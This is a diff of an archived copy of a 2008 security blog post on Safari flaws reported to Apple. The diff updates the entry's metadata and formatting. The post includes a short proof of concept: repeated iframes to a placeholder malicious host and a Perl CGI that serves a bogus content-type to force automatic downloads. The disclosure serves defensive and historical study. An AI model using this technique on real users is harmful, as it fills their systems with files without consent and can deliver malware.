@@ -6,37 +6,38 @@ resource: "http://www.dhanjani.com/blog/2008/05/safari-carpet-b.html"
 tags: [article, webseclist-reference, dhanjani-com, content-type, mime, abuse-of-functionality, iframe, sandbox-escape, owasp-a04-2021, owasp-a05-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T13:12:19+00:00"
+  at: "2026-09-10T00:54:38+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-09-10
 sources:
   - id: original
     resource: "http://www.dhanjani.com/blog/2008/05/safari-carpet-b.html"
     title: Safari Carpet Bomb
-  - id: capture
-    resource: "https://web.archive.org/web/20090223151451/http://www.dhanjani.com/blog/2008/05/safari-carpet-b.html"
+    author: Nitesh Dhanjani
+    last_modified: 2008-05-15
 also_at: []
-authors: []
+authors:
+  - Nitesh Dhanjani
 canonical_url: ""
 cited_by:
   - "2008.md:7"
 commit: ""
-content_sha256: 3dc9d4a8bb603108ac2e03b2bf083b9b2622b8ea68125f94bbaa0b3b5cdcf550
+content_sha256: 2a01103ccaece6079ef913041812817195870a568c6d459d851f071c692d892e
 depth: full
 depth_reason: default
 kind: article
 language: ""
 licence: unknown
 original_url: "http://www.dhanjani.com/blog/2008/05/safari-carpet-b.html"
-published: ""
+published: 2008-05-15
 publisher: dhanjani.com
 publisher_english: ""
 raw_sha256: 7e7e03cbc4d828eef21558dad6e2c17f51ece9907d03aa6305804ba83e039cdb
 retrieved_from: "http://www.dhanjani.com/blog/2008/05/safari-carpet-b.html"
-retrieved_kind: stored
-retrieved_utc: "2026-08-10T13:12:19+00:00"
+retrieved_kind: manual-import
+retrieved_utc: "2026-09-10T00:54:38+00:00"
 slug: dhanjani-com-safari-carpet-bomb
-snapshot: 20090223151451
+snapshot: ""
 title_english: ""
 translation_file: ""
 translation_of: ""
@@ -44,12 +45,11 @@ translation_of: ""
 
 # Safari Carpet Bomb
 
-**Safari Carpet Bomb** - Author not stated, dhanjani.com.
+**Safari Carpet Bomb** - Nitesh Dhanjani, dhanjani.com.
 
-- Published: date not stated
+- Published: 2008-05-15
 - Original: <http://www.dhanjani.com/blog/2008/05/safari-carpet-b.html>
-- Preserved from: http://www.dhanjani.com/blog/2008/05/safari-carpet-b.html (stored) on 2026-08-10
-- Capture timestamp: 20090223151451
+- Preserved from: http://www.dhanjani.com/blog/2008/05/safari-carpet-b.html (manual-import) on 2026-09-10
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -64,13 +64,15 @@ page going offline. To read the original, follow the link above.
 
 I recently communicated 3 security issues in the Safari browser to Apple.
 
- Apple let me know that they will fix 1 of the issues I reported. I will not discuss the vulnerability Apple has promised to fix until they release the fix because it is a high risk issue affecting Safari on OSX and Windows.
+Apple let me know that they will fix 1 of the issues I reported. I will not discuss the vulnerability Apple has promised to fix until they release the fix because it is a high risk issue affecting Safari on OSX and Windows.
 
 I let Apple know that I'd like to discuss the 2 issues they won't be fixing with the security community and they let me know they are fine with it. A quote from my last email to Apple:
 
 *...since you do not consider issue 1 and 2 to be security related, I will feel free to discuss my thoughts within the information security community. Just let me know if you would like me to wait for some amount of time before I do this.*
 
-Response from Apple: * We understand if you want to discuss these in the security community.*
+Response from Apple:
+
+> We understand if you want to discuss these in the security community.
 
 Before I get to the details, I want to make it extremely **clear** that the Apple security team has been a pleasure to communicate with. I sent them a couple of emails asking for clarifications, and they responded quickly and courteously every time. I want to publicly acknowledge that I appreciate this very much.
 
@@ -79,27 +81,30 @@ Here are the issues I reported:
 **1. Safari Carpet Bomb.** It is possible for a rogue website to litter the user's Desktop (Windows) or Downloads directory (~/Downloads/ in OSX). This can happen because the Safari browser cannot be configured to obtain the user's permission before it downloads a resource. Safari downloads the resource without the user's consent and places it in a default location (unless changed).
 
 Assume you visit a malicious site, `http://malicious.example.com/`, that serves the following HTML:
- `
- <HTML>
- <iframe id="frame" src="http://malicious.example.com/cgi-bin/carpet_bomb.cgi"></iframe>
- <iframe id="frame" src="http://malicious.example.com/cgi-bin/carpet_bomb.cgi"></iframe>
- <iframe id="frame" src="http://malicious.example.com/cgi-bin/carpet_bomb.cgi"></iframe>
- ...
- ...
- ...
- ...
- <iframe id="frame" src="http://malicious.example.com/cgi-bin/carpet_bomb.cgi"></iframe>
- </HTML>
- `
- Now assume that `http://malicious.example.com/cgi-bin/carpet_bomb.cgi` is the following:
- `
- #!/usr/bin/perl
- print "Content-type: blah/blah\n\n"
- `
+
+```html
+<HTML>
+<iframe id="frame" src="http://malicious.example.com/cgi-bin/carpet_bomb.cgi"></iframe>
+<iframe id="frame" src="http://malicious.example.com/cgi-bin/carpet_bomb.cgi"></iframe>
+<iframe id="frame" src="http://malicious.example.com/cgi-bin/carpet_bomb.cgi"></iframe>
+...
+...
+...
+...
+<iframe id="frame" src="http://malicious.example.com/cgi-bin/carpet_bomb.cgi"></iframe>
+</HTML>
+```
+
+Now assume that `http://malicious.example.com/cgi-bin/carpet_bomb.cgi` is the following:
+
+```perl
+#!/usr/bin/perl
+print "Content-type: blah/blah\n\n"
+```
 
 Since Safari does not know how to render `content-type` of `blah/blah`, it will automatically start downloading `carpet_bomb.cgi` every time it is served. If you are using Safari in Windows, this is what will happen to your desktop once you visit http://malicious.example.com/ :
 
-[![Safaricarpetbomb](http://dhanjani.typepad.com/photos/uncategorized/2008/07/14/safaricarpetbomb.png)](http://dhanjani.typepad.com/photos/uncategorized/2008/07/14/safaricarpetbomb.png)
+![Safari carpet bomb: repeated downloads cover the Windows desktop.](../../figures/2008/safari-carpet-bomb/figure-1.png)
 
 The implication of this is obvious: Malware downloaded to the user's desktop without the user's consent.
 
@@ -112,7 +117,7 @@ Apple does not feel this is a issue they want to tackle at this time. In my most
 **2. Sandbox not Applied to Local Resources.** This issue is more of a feature set request than a vulnerability. For example, Internet Explorer warns users when a local resource such as an HTML file attempts to invoke client side scripting. I feel this is an important security feature because of user expectations: even the most sophisticated users differentiate between the risk of clicking on an executable they have downloaded (risk perceived to be higher) to clicking on a HTML file they have downloaded (risk perceived to be lower).
 
 Apple's response was positive:
- *...we have been investigating the potential for a "safe" mode for local HTML. This is an area that requires a fairly deep investigation to address compatibility issues, and to determine the proper operation. Please understand that when we label this as a security hardening measure, we are not discounting the benefits that this could have.*
+*...we have been investigating the potential for a "safe" mode for local HTML. This is an area that requires a fairly deep investigation to address compatibility issues, and to determine the proper operation. Please understand that when we label this as a security hardening measure, we are not discounting the benefits that this could have.*
 
 **3. [Undisclosed].** The third issue I reported to Apple is a high risk vulnerability in Safari that can be used to remotely steal local files from the user's file system. Apple responded positively and let me know that they are actively working to resolve the issue and issue a patch. I will post an update if I hear back from them.
 
